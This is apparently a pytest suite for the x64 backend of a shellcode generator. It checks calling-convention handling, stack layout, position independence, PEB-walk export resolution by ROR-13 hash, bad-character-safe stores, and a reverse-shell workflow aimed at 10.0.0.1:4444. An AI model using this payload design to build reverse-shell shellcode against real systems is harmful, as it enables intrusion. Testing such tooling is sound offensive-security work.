"""x64 backend correctness and reliability audit tests.

Sections:
  2. Microsoft x64 ABI correctness
  3. Stack layout audit
  4. Position independence validation
  5. API resolution audit
  6. Workflow execution validation
"""
from __future__ import annotations

import re

import pytest

from emitrion.api_database import API_DATABASE, STRUCT_DATABASE, STRUCT_DATABASE_X64
from emitrion.encode_x64 import (
    encode_dword_into_r64,
    encode_qword,
    safe_call_mem_x64,
    safe_dword_store_x64,
    safe_lea_x64,
    safe_mem_load_x64,
    safe_qword_store,
    safe_word_store_x64,
)
from emitrion.payload_templates.base import TemplateConfig
from emitrion.schema import Manifest, StringEntry, VariableEntry
from emitrion.stack_alloc_x64 import (
    SHADOW_SPACE,
    STRUCT_ZONE_START_X64,
    StackLayoutX64,
    build_layout_x64,
)
from emitrion.workflow.ir import (
    AddressOf,
    AllocateLocal,
    AllocateStruct,
    Block,
    CallAPI,
    Compare,
    ConstructString,
    DefineConstant,
    Immediate,
    Input,
    Jump,
    NameRef,
    SuccessPredicate,
    Terminate,
    TerminateStyle,
    Workflow,
    WriteStructField,
    ZeroStruct,
)
from emitrion.workflow.x64_backend import lower_workflow_x64


def _x64_config(**kwargs) -> TemplateConfig:
    return TemplateConfig(arch="x64", **kwargs)


def _make_manifest(
    functions: list[str] | None = None,
    variables: list[str] | None = None,
    strings: list[tuple[str, str]] | None = None,
    badchars: set[int] | None = None,
) -> Manifest:
    return Manifest(
        badchars=badchars if badchars is not None else {0x00, 0x0A, 0x0D},
        functions=functions or [],
        strings=[
            StringEntry(label=l, value=v, method="mov", dest="rdi")
            for l, v in (strings or [])
        ],
        variables=[VariableEntry(name=n) for n in (variables or [])],
        template="ir_run_command",
        arch="x64",
    )


def _auto_layout_x64(workflow_builder, config, **kwargs):
    """Build layout by probing a workflow, matching build pipeline behavior."""
    from emitrion.workflow.reference import WorkflowTemplate
    from emitrion.api_database import MODULE_LOAD_ORDER

    w = workflow_builder() if callable(workflow_builder) else workflow_builder
    tmpl = WorkflowTemplate(w)
    probed = tmpl.probe_slots(config)

    dll_names = {m.dll for m in MODULE_LOAD_ORDER}
    struct_names = set(STRUCT_DATABASE.keys()) | set(STRUCT_DATABASE_X64.keys())

    functions: list[str] = list(kwargs.get("extra_functions", []))
    variables: list[str] = list(kwargs.get("extra_variables", []))
    strings: list[tuple[str, str]] = list(kwargs.get("extra_strings", []))

    func_set = set(functions)
    var_set = set(variables)
    str_set = {s[0] for s in strings}

    ir_strings = tmpl.probe_strings(config)
    for label, value in ir_strings.items():
        if label not in str_set:
            strings.append((label, value))
            str_set.add(label)

    ir_struct_map = tmpl.probe_structs(config)
    ir_struct_aliases = set(ir_struct_map.keys())
    ir_struct_types = set(ir_struct_map.values())

    for name in probed:
        if name in func_set or name in var_set or name in str_set:
            continue
        if name in struct_names or name in dll_names:
            continue
        if name in ir_struct_aliases or name in ir_struct_types:
            continue
        if name in API_DATABASE:
            functions.append(name)
            func_set.add(name)
        else:
            variables.append(name)
            var_set.add(name)

    needs_loadlib = any(
        API_DATABASE[f].module != "kernel32.dll"
        for f in functions if f in API_DATABASE
    )
    if needs_loadlib and "LoadLibraryA" not in func_set:
        functions.append("LoadLibraryA")

    m = _make_manifest(functions=functions, variables=variables, strings=strings)
    extra_struct_names = list(ir_struct_types)
    max_args = max(
        (len(op.arguments) for b in w.blocks for op in b.operations if isinstance(op, CallAPI)),
        default=0,
    )
    layout = build_layout_x64(m, extra_structs=extra_struct_names, max_stack_args=max(max_args - 4, 0))
    return layout, w


# ---------------------------------------------------------------------------
# Section 2: Microsoft x64 ABI Validation
# ---------------------------------------------------------------------------


class TestABIZeroArgs:
    """Calls with zero arguments: only shadow space, no register setup."""

    def test_zero_arg_call_emits_call_instruction(self) -> None:
        w = Workflow(
            name="test_zero_arg",
            blocks=(
                Block("entry", (
                    CallAPI("ExitProcess", (), result=None),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(functions=["ExitProcess"])
        layout = build_layout_x64(m)
        asm = lower_workflow_x64(w, layout, {0x00}, None)
        assert "call qword ptr" in asm


class TestABIOneArg:
    """Single-arg call: value in RCX."""

    def test_one_arg_in_rcx(self) -> None:
        w = Workflow(
            name="test_one_arg",
            blocks=(
                Block("entry", (
                    CallAPI("ExitProcess", (Immediate(0),)),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(functions=["ExitProcess"])
        layout = build_layout_x64(m)
        asm = lower_workflow_x64(w, layout, {0x00}, None)
        lines = asm.split("\n")
        for i, line in enumerate(lines):
            if "call qword ptr" in line:
                before = "\n".join(lines[max(0, i - 10):i])
                assert "rcx" in before or "ecx" in before, (
                    "First arg must be set up in RCX before call"
                )
                return
        pytest.fail("No call instruction found")


class TestABITwoArgs:
    """Two-arg call: RCX, RDX."""

    def test_two_args_rcx_rdx(self) -> None:
        w = Workflow(
            name="test_two_args",
            blocks=(
                Block("entry", (
                    ConstructString("cmd", Input("command")),
                    CallAPI("WinExec", (NameRef("cmd"), Immediate(0x05)), result="ret"),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["WinExec"], variables=["ret"],
            strings=[("cmd", "calc.exe")],
        )
        layout = build_layout_x64(m)
        config = _x64_config(command="calc.exe")
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        assert "rcx" in asm or "ecx" in asm
        assert "rdx" in asm or "edx" in asm


class TestABIFourArgs:
    """Four-arg call: RCX, RDX, R8, R9."""

    def test_four_register_args(self) -> None:
        w = Workflow(
            name="test_four_args",
            blocks=(
                Block("entry", (
                    AllocateStruct("si", "STARTUPINFOA"),
                    ZeroStruct("si"),
                    CallAPI("CreateProcessA", (
                        Immediate(0), NameRef("cmd"), Immediate(0), Immediate(0),
                    ), result="ret"),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["CreateProcessA"], variables=["ret"],
            strings=[("cmd", "cmd.exe")],
        )
        layout = build_layout_x64(m, max_stack_args=0)
        config = _x64_config()
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        assert "rcx" in asm or "ecx" in asm
        assert "rdx" in asm or "edx" in asm
        assert "r8" in asm
        assert "r9" in asm


class TestABIFiveArgs:
    """Five-arg call: first 4 in registers, 5th at [RSP+0x20]."""

    def test_fifth_arg_on_stack(self) -> None:
        w = Workflow(
            name="test_five_args",
            blocks=(
                Block("entry", (
                    AllocateStruct("si", "STARTUPINFOA"),
                    ZeroStruct("si"),
                    CallAPI("CreateProcessA", (
                        Immediate(0), NameRef("cmd"), Immediate(0), Immediate(0),
                        Immediate(1),
                    ), result="ret"),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["CreateProcessA"], variables=["ret"],
            strings=[("cmd", "cmd.exe")],
        )
        layout = build_layout_x64(m, max_stack_args=1)
        config = _x64_config()
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        assert re.search(r"\[rsp\+0x20\]", asm), (
            "5th argument must be stored at [RSP+0x20]"
        )


class TestABISixArgs:
    """Six-arg call: args 5 and 6 on stack at [RSP+0x20] and [RSP+0x28]."""

    def test_sixth_arg_at_rsp_0x28(self) -> None:
        w = Workflow(
            name="test_six_args",
            blocks=(
                Block("entry", (
                    AllocateStruct("si", "STARTUPINFOA"),
                    ZeroStruct("si"),
                    CallAPI("CreateProcessA", (
                        Immediate(0), NameRef("cmd"), Immediate(0), Immediate(0),
                        Immediate(1), Immediate(0x08000000),
                    ), result="ret"),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["CreateProcessA"], variables=["ret"],
            strings=[("cmd", "cmd.exe")],
        )
        layout = build_layout_x64(m, max_stack_args=2)
        config = _x64_config()
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        assert re.search(r"\[rsp\+0x28\]", asm), (
            "6th argument must be stored at [RSP+0x28]"
        )


class TestABITenArgs:
    """CreateProcessA (10 args): first 4 in regs, last 6 on stack."""

    def test_ten_arg_createprocessa(self) -> None:
        from emitrion.workflow.ir import AddressOf

        w = Workflow(
            name="test_ten_args",
            blocks=(
                Block("entry", (
                    AllocateStruct("si", "STARTUPINFOA"),
                    AllocateStruct("pi", "PROCESS_INFORMATION"),
                    ZeroStruct("si"),
                    ZeroStruct("pi"),
                    CallAPI("CreateProcessA", (
                        Immediate(0),             # lpApplicationName (RCX)
                        NameRef("cmd"),            # lpCommandLine (RDX)
                        Immediate(0),              # lpProcessAttributes (R8)
                        Immediate(0),              # lpThreadAttributes (R9)
                        Immediate(1),              # bInheritHandles [RSP+0x20]
                        Immediate(0x08000000),     # dwCreationFlags [RSP+0x28]
                        Immediate(0),              # lpEnvironment [RSP+0x30]
                        Immediate(0),              # lpCurrentDirectory [RSP+0x38]
                        AddressOf("si"),           # lpStartupInfo [RSP+0x40]
                        AddressOf("pi"),           # lpProcessInformation [RSP+0x48]
                    ), result="ret"),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["CreateProcessA"], variables=["ret"],
            strings=[("cmd", "cmd.exe")],
        )
        layout = build_layout_x64(m, max_stack_args=6)
        config = _x64_config()
        asm = lower_workflow_x64(w, layout, {0x00}, config)

        # All 4 register args
        assert "rcx" in asm or "ecx" in asm
        assert "rdx" in asm or "edx" in asm
        assert "r8" in asm
        assert "r9" in asm

        # Stack args 5-10 at [RSP+0x20..0x48]
        for offset in (0x20, 0x28, 0x30, 0x38, 0x40, 0x48):
            assert re.search(rf"\[rsp\+0x{offset:02x}\]", asm), (
                f"Stack arg at [RSP+0x{offset:02x}] missing"
            )


class TestABINestedCalls:
    """Multiple sequential API calls preserve convention."""

    def test_sequential_calls_independent(self) -> None:
        w = Workflow(
            name="test_nested",
            blocks=(
                Block("entry", (
                    ConstructString("cmd", Input("command")),
                    CallAPI("WinExec", (NameRef("cmd"), Immediate(0x05)), result="r1"),
                    CallAPI("ExitProcess", (Immediate(0),)),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["WinExec", "ExitProcess"], variables=["r1"],
            strings=[("cmd", "calc.exe")],
        )
        layout = build_layout_x64(m)
        config = _x64_config(command="calc.exe")
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        calls = [l for l in asm.split("\n") if "call qword ptr" in l]
        assert len(calls) == 2, f"Expected 2 calls, got {len(calls)}"


class TestABIFailurePaths:
    """Calls followed by Compare/branch on return value."""

    def test_call_result_stored_and_tested(self) -> None:
        w = Workflow(
            name="test_fail_path",
            blocks=(
                Block("entry", (
                    ConstructString("cmd", Input("command")),
                    CallAPI("WinExec", (NameRef("cmd"), Immediate(5)), result="ret"),
                    Compare("ret", SuccessPredicate.NONZERO, "ok", "fail"),
                )),
                Block("ok", (Terminate(),)),
                Block("fail", (
                    CallAPI("ExitProcess", (Immediate(1),)),
                    Terminate(),
                )),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["WinExec", "ExitProcess"], variables=["ret"],
            strings=[("cmd", "calc.exe")],
        )
        layout = build_layout_x64(m)
        config = _x64_config(command="calc.exe")
        asm = lower_workflow_x64(w, layout, {0x00}, config)
        assert "test rax, rax" in asm
        assert "jnz" in asm
        assert "wf_fail:" in asm


class TestABIStackAlignment:
    """16-byte RSP alignment at CALL instruction point."""

    def test_prologue_alignment_guard(self) -> None:
        """The compose pipeline must include alignment enforcement."""
        from emitrion.build_x64 import compose_asm_x64
        m = _make_manifest(functions=["WinExec"], strings=[("cmd", "calc.exe")])
        layout = build_layout_x64(m)
        asm = compose_asm_x64(m, layout, "test.yaml")
        # Must contain explicit alignment (and rsp, -16) or equivalent
        has_align = (
            "and  rsp" in asm.lower()
            or "and rsp" in asm.lower()
        )
        assert has_align, (
            "Prologue must enforce 16-byte alignment with 'and rsp, -16' "
            "to handle unknown entry alignment in shellcode context"
        )


# ---------------------------------------------------------------------------
# Section 3: Stack Layout Audit
# ---------------------------------------------------------------------------


class TestStackLayoutNoOverlap:
    """Verify no two slots occupy the same address range."""

    def _check_no_overlap(self, layout: StackLayoutX64) -> None:
        slots = layout.all_slots()
        for i, a in enumerate(slots):
            for b in slots[i + 1:]:
                a_end = a.offset + a.size
                b_end = b.offset + b.size
                overlap = max(0, min(a_end, b_end) - max(a.offset, b.offset))
                assert overlap == 0, (
                    f"Slots '{a.name}' [0x{a.offset:x}..0x{a_end:x}) and "
                    f"'{b.name}' [0x{b.offset:x}..0x{b_end:x}) overlap by {overlap} bytes"
                )

    def test_run_command_no_overlap(self) -> None:
        m = _make_manifest(functions=["WinExec"], strings=[("cmd", "calc.exe")])
        layout = build_layout_x64(m)
        self._check_no_overlap(layout)

    def test_revshell_no_overlap(self) -> None:
        m = _make_manifest(
            functions=["CreateProcessA", "LoadLibraryA", "WSAStartup",
                       "WSASocketA", "connect"],
            variables=["socket_handle"],
            strings=[("cmd", "cmd.exe"), ("ws2_dll", "ws2_32.dll")],
        )
        layout = build_layout_x64(m, max_stack_args=6)
        self._check_no_overlap(layout)

    def test_many_functions_no_overflow(self) -> None:
        funcs = ["WinExec", "CreateProcessA", "ExitProcess", "LoadLibraryA",
                 "GetModuleHandleA"]
        m = _make_manifest(functions=funcs)
        layout = build_layout_x64(m)
        for slot in layout.all_slots():
            assert slot.offset + slot.size <= layout.frame_size


class TestStackLayoutShadowSpace:
    """Shadow space must be at [RSP+0x00..0x1F] minimum."""

    def test_shadow_space_untouched_by_slots(self) -> None:
        m = _make_manifest(functions=["WinExec"], strings=[("cmd", "calc.exe")])
        layout = build_layout_x64(m)
        for slot in layout.all_slots():
            if slot.category == "shadow":
                continue
            assert slot.offset >= SHADOW_SPACE, (
                f"Slot '{slot.name}' at offset 0x{slot.offset:x} intrudes "
                f"into shadow space [0x00..0x{SHADOW_SPACE - 1:x}]"
            )

    def test_extended_shadow_for_stack_args(self) -> None:
        m = _make_manifest(functions=["CreateProcessA"],
                           strings=[("cmd", "cmd.exe")])
        layout = build_layout_x64(m, max_stack_args=6)
        first_non_shadow = min(
            s.offset for s in layout.all_slots() if s.category != "shadow"
        )
        needed = SHADOW_SPACE + 6 * 8
        assert first_non_shadow >= needed, (
            f"First non-shadow slot at 0x{first_non_shadow:x} but need "
            f"0x{needed:x} for shadow + 6 stack args"
        )


class TestStackLayoutFrameworkContextIsolation:
    """Framework stubs save export context at [rbp-0x08..0x30].

    After 'mov rbp, rsp; sub rsp, frame_size', those offsets map to
    [RSP + frame_size - 0x08] through [RSP + frame_size - 0x30].
    No allocator slot may overlap this region.
    """

    def test_slots_below_framework_context(self) -> None:
        m = _make_manifest(
            functions=["CreateProcessA", "LoadLibraryA", "WSAStartup",
                       "WSASocketA", "connect"],
            variables=["socket_handle"],
            strings=[("cmd", "cmd.exe"), ("ws2_dll", "ws2_32.dll")],
        )
        layout = build_layout_x64(m, max_stack_args=6)
        framework_low = layout.frame_size - 0x30
        for slot in layout.all_slots():
            slot_end = slot.offset + slot.size
            assert slot_end <= framework_low, (
                f"Slot '{slot.name}' [0x{slot.offset:x}..0x{slot_end:x}) "
                f"overlaps framework context area "
                f"[0x{framework_low:x}..0x{layout.frame_size:x})"
            )

    def test_large_manifest_no_context_collision(self) -> None:
        """Manifest with many strings should not collide with framework area."""
        long_strings = [(f"s{i}", "A" * 50) for i in range(10)]
        m = _make_manifest(
            functions=["CreateProcessA", "LoadLibraryA", "WSAStartup",
                       "WSASocketA", "connect"],
            variables=["socket_handle"],
            strings=long_strings + [("ws2_dll", "ws2_32.dll")],
        )
        layout = build_layout_x64(m, max_stack_args=6)
        framework_low = layout.frame_size - 0x30
        highest_slot = max(
            s.offset + s.size for s in layout.all_slots()
        )
        assert highest_slot <= framework_low, (
            f"Highest slot end 0x{highest_slot:x} overlaps framework "
            f"context at 0x{framework_low:x}"
        )


class TestStackLayout16ByteAlignment:
    """Frame size must be 16-byte aligned."""

    def test_frame_size_aligned(self) -> None:
        for funcs, strs in (
            (["WinExec"], [("cmd", "calc.exe")]),
            (["CreateProcessA"], [("cmd", "cmd.exe")]),
            (["CreateProcessA", "LoadLibraryA", "WSAStartup", "WSASocketA", "connect"],
             [("cmd", "cmd.exe"), ("ws2_dll", "ws2_32.dll")]),
        ):
            m = _make_manifest(functions=funcs, strings=strs)
            layout = build_layout_x64(m)
            assert layout.frame_size % 16 == 0, (
                f"Frame size 0x{layout.frame_size:x} is not 16-byte aligned"
            )


# ---------------------------------------------------------------------------
# Section 4: Position Independence Validation
# ---------------------------------------------------------------------------


class TestPositionIndependence:
    """No absolute addresses in generated assembly."""

    _ABSOLUTE_PATTERNS = [
        re.compile(r"\bmov\s+\w+,\s*0x[0-9a-f]{9,16}\b", re.IGNORECASE),
    ]
    _ALLOWED_ABSOLUTES = {
        "0xffffffffffffffff",
        "0xffffffff",
    }
    _FORBIDDEN_PATTERNS = [
        re.compile(r"\bfs:\[", re.IGNORECASE),
        re.compile(r"\[esp", re.IGNORECASE),
        re.compile(r"\[ebp", re.IGNORECASE),
    ]

    def _check_pi(self, asm: str) -> None:
        for pat in self._FORBIDDEN_PATTERNS:
            matches = pat.findall(asm)
            assert not matches, f"Position-dependent pattern found: {matches[0]}"

    def test_framework_stubs_pi(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        self._check_pi(stubs)

    def test_full_compose_pi(self) -> None:
        from emitrion.build_x64 import compose_asm_x64
        m = _make_manifest(functions=["WinExec"], strings=[("cmd", "calc.exe")])
        layout = build_layout_x64(m)
        asm = compose_asm_x64(m, layout, "test.yaml")
        self._check_pi(asm)

    def test_workflow_pi(self) -> None:
        from emitrion.workflow.reference import build_run_command_workflow
        config = _x64_config(command="calc.exe")
        layout, w = _auto_layout_x64(build_run_command_workflow, config)
        asm = lower_workflow_x64(w, layout, {0x00, 0x0A, 0x0D}, config)
        self._check_pi(asm)

    def test_no_absolute_jmp_targets(self) -> None:
        from emitrion.build_x64 import compose_asm_x64
        m = _make_manifest(functions=["WinExec"], strings=[("cmd", "calc.exe")])
        layout = build_layout_x64(m)
        asm = compose_asm_x64(m, layout, "test.yaml")
        for line in asm.split("\n"):
            stripped = line.strip()
            if stripped.startswith("jmp") or stripped.startswith("call"):
                assert "0x" not in stripped or "qword ptr" in stripped or "short" in stripped, (
                    f"Potentially absolute jump/call: {stripped}"
                )


# ---------------------------------------------------------------------------
# Section 5: API Resolution Audit
# ---------------------------------------------------------------------------


class TestPEBWalkCorrectness:
    """PEB access offsets must match x64 structures."""

    def test_gs_peb_offset(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert "gs:[rcx + 0x60]" in stubs or "gs:[rcx+0x60]" in stubs

    def test_peb_ldr_offset_0x18(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert "0x18" in stubs

    def test_ldr_in_init_order_offset_0x30(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert "0x30" in stubs

    def test_module_base_offset_0x20(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert "0x20" in stubs

    def test_base_dll_name_offset_0x48(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert "0x48" in stubs


class TestPE32PlusExportParsing:
    """PE32+ export directory offsets."""

    def test_export_dir_at_0x88(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert "0x88" in stubs

    def test_e_lfanew_at_0x3c(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert "0x3c" in stubs

    def test_number_of_names_at_0x18(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert re.search(r"rax \+ 0x18", stubs)

    def test_address_of_names_at_0x20(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert re.search(r"rax \+ 0x20", stubs)

    def test_address_of_ordinals_at_0x24(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert re.search(r"rax \+ 0x24", stubs)

    def test_address_of_functions_at_0x1c(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert re.search(r"rax \+ 0x1c", stubs)


class TestHashComputation:
    """ROR-13 hash is used consistently."""

    def test_ror_13_in_resolver(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        stubs = _emit_framework_stubs_x64(set())
        assert "ror  edx, 0x0d" in stubs.lower()

    def test_hash_values_match(self) -> None:
        from emitrion.hash_gen import ror13
        from emitrion.build_x64 import _emit_api_resolution_x64
        m = _make_manifest(functions=["WinExec"])
        layout = build_layout_x64(m)
        asm = _emit_api_resolution_x64(m, layout, "kernel32.dll")
        expected_hash = ror13("WinExec")
        assert f"0x{expected_hash:08x}" in asm


# ---------------------------------------------------------------------------
# Section 5b: Scratch register conflict audit
# ---------------------------------------------------------------------------


class TestScratchRegisterConflict:
    """When src_reg == tmp in badchar-safe stores, the value must not be clobbered."""

    def test_qword_store_r11_src_badchar_offset(self) -> None:
        """safe_qword_store with src=r11 and badchar offset must not clobber r11."""
        lines = safe_qword_store("rsp", 0x0A, "r11", {0x0A})
        assert len(lines) > 1, "Should take badchar path"
        store_lines = [l for l in lines if "mov" in l and "qword ptr" in l]
        assert store_lines, "Must have a qword store instruction"
        # The final store must reference r11 as source, not the computed address register
        final_store = store_lines[-1]
        assert "r11" in final_store, "Final store must use r11 as source"
        # The address computation must use a DIFFERENT register (not r11)
        addr_lines = [l for l in lines if "add" in l]
        for addr_line in addr_lines:
            parts = addr_line.strip().split()
            assert parts[1].rstrip(",") != "r11", (
                f"Address computation must not use r11 when r11 is the source: {addr_line}"
            )

    def test_dword_store_r11d_src_badchar_offset(self) -> None:
        """safe_dword_store_x64 with src=r11d and badchar offset must not clobber."""
        lines = safe_dword_store_x64("rsp", 0x0A, "r11d", {0x0A})
        assert len(lines) > 1
        store_lines = [l for l in lines if "mov" in l and "dword ptr" in l]
        assert store_lines
        assert "r11d" in store_lines[-1]
        addr_lines = [l for l in lines if "add" in l]
        for addr_line in addr_lines:
            parts = addr_line.strip().split()
            assert "r11" not in parts[1].rstrip(","), (
                f"Address computation uses r11 family but src is r11d: {addr_line}"
            )

    def test_word_store_r11w_src_badchar_offset(self) -> None:
        """safe_word_store_x64 with src=r11w and badchar offset must not clobber."""
        lines = safe_word_store_x64("rsp", 0x0A, "r11w", {0x0A})
        assert len(lines) > 1
        store_lines = [l for l in lines if "mov" in l and "word ptr" in l]
        assert store_lines
        assert "r11w" in store_lines[-1]

    def test_qword_store_non_conflict_still_works(self) -> None:
        """Non-conflicting case (src=rax, tmp=r11) must still work."""
        lines = safe_qword_store("rsp", 0x0A, "rax", {0x0A})
        asm = "\n".join(lines)
        assert "rax" in asm
        assert len(lines) > 1

    def test_mem_load_dst_equals_tmp(self) -> None:
        """safe_mem_load_x64 with dst=r11 and badchar offset must work."""
        lines = safe_mem_load_x64("r11", "rsp", 0x0A, {0x0A})
        assert len(lines) > 1

    def test_string_emit_with_badchar_offset(self) -> None:
        """String emission that uses r11d for chunk value must survive badchar offset.

        This is the primary collision site: _emit_strings_x64 calls
        safe_dword_store_x64("rsp", offset, "r11d", bc) where offset may have badchars.
        """
        from emitrion.build_x64 import _emit_strings_x64
        m = _make_manifest(
            functions=["WinExec"],
            strings=[("cmd", "calc.exe")],
            badchars={0x0A},
        )
        # Force a string offset that contains 0x0A
        # We can't control the exact offset, but we can test the encoding functions
        # are safe when called with r11 source
        lines = safe_dword_store_x64("rsp", 0x10A, "r11d", {0x0A})
        asm = "\n".join(lines)
        assert len(lines) > 1


# ---------------------------------------------------------------------------
# Section 6: Workflow Execution Validation
# ---------------------------------------------------------------------------


class TestWorkflowAPIResolve:
    """API resolution workflow: hash loaded, resolver called, result stored."""

    def test_api_resolution_stores_to_slot(self) -> None:
        from emitrion.build_x64 import _emit_api_resolution_x64
        m = _make_manifest(functions=["WinExec"])
        layout = build_layout_x64(m)
        asm = _emit_api_resolution_x64(m, layout, "kernel32.dll")
        assert "resolve_export_by_hash" in asm
        winexec_slot = layout.slot("WinExec")
        assert f"0x{winexec_slot.offset:02x}" in asm


class TestWorkflowWinExec:
    """WinExec workflow: string built, call made, result checked."""

    def test_full_winexec_workflow(self) -> None:
        from emitrion.workflow.reference import build_run_command_workflow
        config = _x64_config(command="calc.exe")
        layout, w = _auto_layout_x64(build_run_command_workflow, config)
        asm = lower_workflow_x64(w, layout, {0x00, 0x0A, 0x0D}, config)
        assert "WinExec" in asm
        assert "call qword ptr" in asm
        assert "test rax, rax" in asm or "cmp" in asm


class TestWorkflowVirtualAlloc:
    """VirtualAlloc-using workflow (reverse shell uses WSAStartup which has a large struct)."""

    def test_reverse_shell_struct_zeroing(self) -> None:
        from emitrion.workflow.reference import build_reverse_shell_workflow
        config = _x64_config(lhost="10.0.0.1", lport=4444)
        layout, w = _auto_layout_x64(build_reverse_shell_workflow, config)
        asm = lower_workflow_x64(w, layout, {0x00, 0x0A, 0x0D}, config)
        assert "xor  eax, eax" in asm
        assert "rep  stosq" in asm or "qword ptr" in asm


class TestWorkflowComparePredicates:
    """All compare predicates produce correct branch instructions."""

    def _lower_with_predicate(self, pred: SuccessPredicate) -> str:
        w = Workflow(
            name="test_pred",
            blocks=(
                Block("entry", (
                    ConstructString("cmd", Input("command")),
                    CallAPI("WinExec", (NameRef("cmd"), Immediate(5)), result="ret"),
                    Compare("ret", pred, "ok", "fail"),
                )),
                Block("ok", (Terminate(),)),
                Block("fail", (Terminate(),)),
            ),
            entry="entry",
        )
        m = _make_manifest(
            functions=["WinExec"], variables=["ret"],
            strings=[("cmd", "calc.exe")],
        )
        layout = build_layout_x64(m)
        config = _x64_config(command="calc.exe")
        return lower_workflow_x64(w, layout, {0x00}, config)

    def test_nonzero_uses_jnz(self) -> None:
        asm = self._lower_with_predicate(SuccessPredicate.NONZERO)
        assert "jnz" in asm

    def test_zero_uses_jz(self) -> None:
        asm = self._lower_with_predicate(SuccessPredicate.ZERO)
        assert "jz" in asm

    def test_null_uses_jz(self) -> None:
        asm = self._lower_with_predicate(SuccessPredicate.NULL)
        assert "jz" in asm

    def test_invalid_handle_uses_cmp_or_sub(self) -> None:
        asm = self._lower_with_predicate(SuccessPredicate.INVALID_HANDLE)
        assert "cmp" in asm or "sub" in asm
        # Must compare against 0xFFFFFFFFFFFFFFFF (64-bit -1)
        assert "ffffffff" in asm.lower()

    def test_signed_negative_uses_jns(self) -> None:
        asm = self._lower_with_predicate(SuccessPredicate.SIGNED_NEGATIVE)
        assert "jns" in asm


class TestWorkflowE2EBuildPipeline:
    """End-to-end build pipeline produces valid output."""

    def test_run_command_e2e(self) -> None:
        import pathlib
        from emitrion.build_x64 import build_x64
        path = str(pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "run_command_x64.yaml")
        result = build_x64(path, assemble=False)
        assert result.asm
        assert "[BITS 64]" in result.asm
        assert "gs:" in result.asm.lower()
        assert "resolve_export_by_hash" in result.asm
        assert "call qword ptr" in result.asm

    def test_revshell_e2e(self) -> None:
        import pathlib
        from emitrion.build_x64 import build_x64
        path = str(pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "revshell_x64.yaml")
        result = build_x64(path, assemble=False)
        assert result.asm
        assert "WSAStartup" in result.asm
        assert "connect" in result.asm
        assert "CreateProcessA" in result.asm


# -- Phase A regression tests (code review fixes) --


class TestP0_1_ResolverFailurePath:
    """P0-1: resolve_export_by_hash halts on miss (int3)."""

    def test_export_not_found_halts(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        asm = _emit_framework_stubs_x64({0x00})
        after_loop = asm.split("jl   find_export_loop")[-1]
        assert "int3" in after_loop

    def test_export_not_found_no_null_return(self) -> None:
        from emitrion.build_x64 import _emit_framework_stubs_x64
        asm = _emit_framework_stubs_x64({0x00})
        after_loop = asm.split("jl   find_export_loop")[-1]
        assert "ret" not in after_loop.split("int3")[0]


class TestP0_2_DLLLoaderNoRSPMutation:
    """P0-2: DLL loading must not push to stack or modify RSP."""

    def test_no_push_in_dll_load(self) -> None:
        import pathlib
        from emitrion.build_x64 import build_x64
        path = str(pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "revshell_x64.yaml")
        result = build_x64(path, assemble=False)
        dll_section = result.asm.split("Loading ws2_32.dll")[1].split("resolve")[0]
        for line in dll_section.splitlines():
            stripped = line.strip()
            if stripped.startswith(";"):
                continue
            assert not stripped.startswith("push "), f"RSP-mutating push found: {stripped}"

    def test_dll_load_uses_string_slot(self) -> None:
        import pathlib
        from emitrion.build_x64 import build_x64
        path = str(pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "revshell_x64.yaml")
        result = build_x64(path, assemble=False)
        dll_section = result.asm.split("Loading ws2_32.dll")[1].split("resolve")[0]
        assert "lea  rcx" in dll_section or "lea  ecx" in dll_section or \
               ("add" in dll_section and "mov  rcx" in dll_section)

    def test_no_add_rsp_cleanup(self) -> None:
        import pathlib
        from emitrion.build_x64 import build_x64
        path = str(pathlib.Path(__file__).parent.parent / "manifests" / "x64" / "revshell_x64.yaml")
        result = build_x64(path, assemble=False)
        dll_section = result.asm.split("Loading ws2_32.dll")[1].split("resolve")[0]
        for line in dll_section.splitlines():
            stripped = line.strip()
            if stripped.startswith(";"):
                continue
            assert "add  rsp" not in stripped, f"RSP cleanup found: {stripped}"


